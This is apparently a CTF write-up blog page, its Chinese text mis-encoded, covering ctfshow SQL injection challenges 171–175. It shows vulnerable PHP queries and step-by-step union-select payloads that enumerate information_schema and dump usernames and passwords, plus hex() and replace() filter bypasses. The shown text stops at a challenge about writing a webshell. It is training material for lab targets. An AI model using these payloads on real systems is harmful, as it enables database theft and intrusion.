class="toc-text">web-181ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€é€»è¾‘è¿ç®—ä¼˜å…ˆçº§ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-182%EF%BC%88%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E4%BC%98%E5%85%88%E7%BA%A7%E3%80%81%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-text">web-182ï¼ˆé€»è¾‘è¿ç®—ä¼˜å…ˆçº§ã€ç›²æ³¨ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-183%EF%BC%88count%E3%80%81python%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8Clike%E6%88%96%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-text">web-183ï¼ˆcountã€pythonè„šæœ¬è¿›è¡Œlikeæˆ–æ­£åˆ™åŒ¹é…ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-184%EF%BC%88group-by%E7%BB%95%E8%BF%87where%E8%BF%87%E6%BB%A4%E3%80%81%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4%E3%80%81regexp%EF%BC%89"><span class="toc-text">web-184ï¼ˆgroup byç»•è¿‡whereè¿‡æ»¤ã€åå…­è¿›åˆ¶ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤ã€regexpï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-185%EF%BC%88python%E8%84%9A%E6%9C%AC%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E3%80%81%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-185ï¼ˆpythonè„šæœ¬æ­£åˆ™åŒ¹é…ã€æ•°å­—è¿‡æ»¤ç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-186%EF%BC%88%E5%90%8C%E4%B8%8A%EF%BC%89"><span class="toc-text">web-186ï¼ˆåŒä¸Šï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-187%EF%BC%88mysql%E7%89%B9%E6%80%A7%E3%80%81md5%EF%BC%89"><span class="toc-text">web-187ï¼ˆmysqlç‰¹æ€§ã€md5ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-188%EF%BC%88mysql%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%EF%BC%89"><span class="toc-text">web-188ï¼ˆmysqlå¼±ç±»å‹æ¯”è¾ƒï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-189%EF%BC%88sql%E7%9B%B2%E6%B3%A8%E3%80%81load-file%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E3%80%81if%EF%BC%89"><span class="toc-text">web-189ï¼ˆsqlç›²æ³¨ã€load_fileå‡½æ•°è¯»å–æ–‡ä»¶ã€ifï¼‰</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="web-171ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ï¼‰"><a href="#web-171ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ï¼‰" class="headerlink" title="web-171ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ï¼‰"></a>web-171ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p><strong>æ— è¿‡æ»¤çš„å­—ç¬¦å‹æ³¨å…¥</strong></p>
<p>payloadæ­¥éª¤ï¼š</p>
<figure class="highlight flix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs flix"><span class="hljs-number">1</span> or <span class="hljs-number">1</span>=<span class="hljs-number">2</span> --+	<span class="hljs-comment">//æ­£å¸¸å›æ˜¾idä¸º1çš„ç”¨æˆ·ï¼Œæ’é™¤æ•°å­—å‹ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹</span><br><br><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+	<span class="hljs-comment">//ä½¿ç”¨æ³¨é‡Šç¬¦å¾—åˆ°flag</span><br>æˆ–è€…<br><span class="hljs-number">1</span>&#x27; or <span class="hljs-string">&#x27;1&#x27;</span> = &#x27;<span class="hljs-number">1</span>	<span class="hljs-comment">//æ‰‹å·¥é—­åˆå¾—åˆ°flag</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-172ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ã€unionè”åˆæŸ¥è¯¢ï¼‰"><a href="#web-172ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ã€unionè”åˆæŸ¥è¯¢ï¼‰" class="headerlink" title="web-172ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ã€unionè”åˆæŸ¥è¯¢ï¼‰"></a>web-172ï¼ˆæ— è¿‡æ»¤å­—ç¬¦å‹æ³¨å…¥ã€unionè”åˆæŸ¥è¯¢ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>-&gt;username!==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;<br>    &#125;  <br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p><strong>æ·»åŠ é™åˆ¶æ¡ä»¶ name!&#x3D;â€˜flagâ€™ è¾“å‡ºçš„usernameä¸­ä¸èƒ½æœ‰flag</strong></p>
<p><strong>æ‰€ä»¥åªèƒ½ç”¨unionè”åˆæŸ¥è¯¢äº†ï¼Œèµ°æµç¨‹</strong></p>
<p><strong>çˆ†åº“å-&gt;çˆ†è¡¨å-&gt;çˆ†åˆ—å-&gt;çˆ†å­—æ®µå€¼</strong></p>
<p>payloadæ„é€ æ­¥éª¤ï¼š</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-comment">//åˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥</span><br><span class="hljs-number">1</span> <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> --+	<br><span class="hljs-comment">//åˆ¤æ–­ä¸ºå•å¼•å·é—­åˆ</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+ 	<br><span class="hljs-comment">//æµ‹å‡ºæ­¤è¡¨æœ‰2åˆ—</span><br><span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> --+	<br><span class="hljs-comment">//çˆ†å‡ºåº“åä¸ºctfshow_web</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database() --+	<br><span class="hljs-comment">//çˆ†å‡ºä¸¤è¡¨åctfshow_user,ctfshow_user2</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema = &#x27;ctfshow_web&#x27; --+	<br><span class="hljs-comment">//çˆ†å‡ºåˆ—åid,username,password</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name = &#x27;ctfshow_user2&#x27; --+	<br><span class="hljs-comment">//æ ¹æ®åˆ—åçˆ†å‡ºæ•°æ®å¾—åˆ°flag</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,&#x27;-&#x27;,password) <span class="hljs-keyword">from</span> ctfshow_user2  --+	<span class="hljs-comment">//çˆ†å‡ºå…¨éƒ¨æ•°æ®</span><br>æˆ–è€…ç›´æ¥ç­›é€‰flag<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,&#x27;-&#x27;,password) <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-built_in">where</span> username = &#x27;flag&#x27; --+<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-173ï¼ˆå­—ç¬¦å‹æ³¨å…¥ã€hexå‡½æ•°ç»•è¿‡æ­£åˆ™è¿‡æ»¤flagï¼‰"><a href="#web-173ï¼ˆå­—ç¬¦å‹æ³¨å…¥ã€hexå‡½æ•°ç»•è¿‡æ­£åˆ™è¿‡æ»¤flagï¼‰" class="headerlink" title="web-173ï¼ˆå­—ç¬¦å‹æ³¨å…¥ã€hexå‡½æ•°ç»•è¿‡æ­£åˆ™è¿‡æ»¤flagï¼‰"></a>web-173ï¼ˆå­—ç¬¦å‹æ³¨å…¥ã€hexå‡½æ•°ç»•è¿‡æ­£åˆ™è¿‡æ»¤flagï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p><strong>è¿”å›æ•°æ®ä¼šæ£€æŸ¥æ˜¯å¦æœ‰username&#x3D;â€™flagâ€™ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸æŸ¥usernameå­—æ®µå°±è¡Œäº†ï¼Œæˆ–è€…å°†usernameå­—æ®µä½¿ç”¨hexå‡½æ•°ç¼–ç </strong></p>
<p><strong>è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯å°†flagæ›¿æ¢</strong></p>
<p>payloadï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">å‰é¢åŒæ ·çš„æ­¥éª¤ï¼Œè¿™é‡Œä¸å†™äº†ï¼ŒåŒºåˆ«åœ¨äºè¿™é‡Œæœ‰3åˆ—ï¼Œå¹¶ä¸”flagæ‰€åœ¨è¡¨åä¸ºctfshow_user3ï¼Œç›´æ¥ä¸å¸¦usernameå­—æ®µè”åˆæŸ¥è¯¢<br>-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br><br>æˆ–è€…<br>å› ä¸ºå­—æ®µä¸­ä¸å…è®¸å‡ºç°flag  æ‰€ä»¥ç›´æ¥æŠŠå­—æ®µæ”¹æˆhex()æ ¼å¼ ï¼Œè¿™æ ·å°±é¿å¼€ äº†ï¼Œ<br>äºæ˜¯å‡ºç°çš„ä¸€è¡Œä¸­ï¼Œæ˜¾ç¤ºä¸º<span class="hljs-number">666</span>C6167 è¿™æ­£æ˜¯â€™flag<span class="hljs-string">&#x27;è¿™hex() æ ¼å¼ï¼Œ  åé¢çš„flag æ­£æ˜¯</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,hex(username),<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br><br>æˆ–è€…<br>æ›¿æ¢<span class="hljs-string">&quot;flag&quot;</span>ï¼Œæ»¡è¶³æ£€æµ‹ï¼Œè¿™é‡ŒæŠŠflagä¸­çš„fæ¢æˆgå°±èƒ½æ»¡è¶³æ£€æµ‹äº†<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select id,replace(username,&#x27;</span>f<span class="hljs-string">&#x27;,&#x27;</span>g<span class="hljs-string">&#x27;),password from ctfshow_user3 where username = &#x27;</span>flag<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-174ï¼ˆæ­£åˆ™è¿‡æ»¤æ•°å­—ã€replaceå‡½æ•°ç»•è¿‡ã€ç›²æ³¨ï¼‰"><a href="#web-174ï¼ˆæ­£åˆ™è¿‡æ»¤æ•°å­—ã€replaceå‡½æ•°ç»•è¿‡ã€ç›²æ³¨ï¼‰" class="headerlink" title="web-174ï¼ˆæ­£åˆ™è¿‡æ»¤æ•°å­—ã€replaceå‡½æ•°ç»•è¿‡ã€ç›²æ³¨ï¼‰"></a>web-174ï¼ˆæ­£åˆ™è¿‡æ»¤æ•°å­—ã€replaceå‡½æ•°ç»•è¿‡ã€ç›²æ³¨ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>å‘ç°è¿‡æ»¤äº†flagä¸æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨mysqlçš„replaceæ›¿æ¢æ•°å­—ã€æˆ–è€…ä½¿ç”¨ç›²æ³¨è„šæœ¬ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™é‡Œå¤±è´¥äº†ï¼‰</p>
<p>payloadï¼š</p>
<p>replaceå‡½æ•°ç»•è¿‡åšæ³•</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">å‰é¢åˆ¤æ–­é—­åˆç±»å‹å’Œåˆ—æ•°å°±ä¸å†™äº†ï¼Œå•å¼•å·é—­åˆï¼Œä¸¤åˆ—<br>//çˆ†åº“åï¼Œå› ä¸ºæ•°å­—è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œç”¨<span class="hljs-string">&#x27;a&#x27;</span>æ¥ç»•è¿‡ï¼Œå¹¶ä¸”ä»è¿™é‡Œå¼€å§‹è¦ä½¿ç”¨replaceå‡½æ•°æ›¿æ¢æ‰æ•°å­—äº†	<br>çˆ†å‡ºåº“åä¸ºctfshow_web<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(database(),&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;,&#x27;</span>nin<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;,&#x27;</span>eight<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;,&#x27;</span>seven<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;,&#x27;</span>six<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;,&#x27;</span>fiv<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;,&#x27;</span>four<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;,&#x27;</span>thre<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span>two<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">on</span><span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;,&#x27;</span>zero<span class="hljs-string">&#x27;) --+</span><br><span class="hljs-string">//çˆ†è¡¨åï¼ŒæŸ¥å‡ºè¡¨åä¸ºctfshow_userfourï¼Œå³ctfshow_user4</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;nine&#x27;</span>),<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;eight&#x27;</span>),<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;seven&#x27;</span>),<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;six&#x27;</span>),<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;five&#x27;</span>),<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;four&#x27;</span>),<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;three&#x27;</span>),<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;two&#x27;</span>),<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;one&#x27;</span>),<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;zero&#x27;</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;ctfshow_web&#x27;</span> <span class="hljs-comment">--+</span><br>//çˆ†åˆ—åï¼ŒæŸ¥å‡ºåˆ—åä¸ºid,username,<span class="hljs-keyword">password</span><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(column_name),&#x27;</span><span class="hljs-number">9</span><span class="hljs-string">&#x27;,&#x27;</span>nin<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">8</span><span class="hljs-string">&#x27;,&#x27;</span>eight<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">7</span><span class="hljs-string">&#x27;,&#x27;</span>seven<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">6</span><span class="hljs-string">&#x27;,&#x27;</span>six<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">5</span><span class="hljs-string">&#x27;,&#x27;</span>fiv<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;,&#x27;</span>four<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27;,&#x27;</span>thre<span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span>two<span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-keyword">on</span><span class="hljs-string">e&#x27;),&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;,&#x27;</span>zero<span class="hljs-string">&#x27;) from information_schema.columns where table_name = &#x27;</span>ctfshow_user4<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">//çˆ†æ•°æ®ï¼Œè¿™é‡ŒæŠŠflagä¸­çš„fæ›¿æ¢ä¸ºGæ¥ç»•è¿‡ï¼Œå¾—åˆ°flagã€‚</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> REPLACE(username,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>), REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(<span class="hljs-keyword">password</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;nine&#x27;</span>),<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;eight&#x27;</span>),<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;seven&#x27;</span>),<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;six&#x27;</span>),<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;five&#x27;</span>),<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;four&#x27;</span>),<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;three&#x27;</span>),<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;two&#x27;</span>),<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;one&#x27;</span>),<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;zero&#x27;</span>) <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-comment">--+</span><br><br>å¾—åˆ°flagä¸ºctfshow&#123;eightdsixabtwodb-onezerothreefive-fourbdd-bddtwo-zerodabbbbdonezeroeightc&#125;<br>æˆ‘ä»¬æœ€åè¿˜è¦æ ¹æ®æ›¿æ¢çš„å­—ç¬¦è§£ç <br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-175ï¼ˆæ­£åˆ™è¿‡æ»¤ascii-0-127ç»•è¿‡ã€åˆ©ç”¨into-outfileå†™å…¥webshellã€æ—¶é—´ç›²æ³¨-ï¼‰"><a href="#web-175ï¼ˆæ­£åˆ™è¿‡æ»¤ascii-0-127ç»•è¿‡ã€åˆ©ç”¨into-outfileå†™å…¥webshellã€æ—¶é—´ç›²æ³¨-ï¼‰" class="headerlink" title="web-175ï¼ˆæ­£åˆ™è¿‡æ»¤ascii 0-127ç»•è¿‡ã€åˆ©ç”¨into outfileå†™å…¥webshellã€æ—¶é—´ç›²æ³¨ ï¼‰"></a>web-175ï¼ˆæ­£åˆ™è¿‡æ»¤ascii 0-127ç»•è¿‡ã€åˆ©ç”¨into outfileå†™å…¥webshellã€æ—¶é—´ç›²æ³¨ ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user5 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
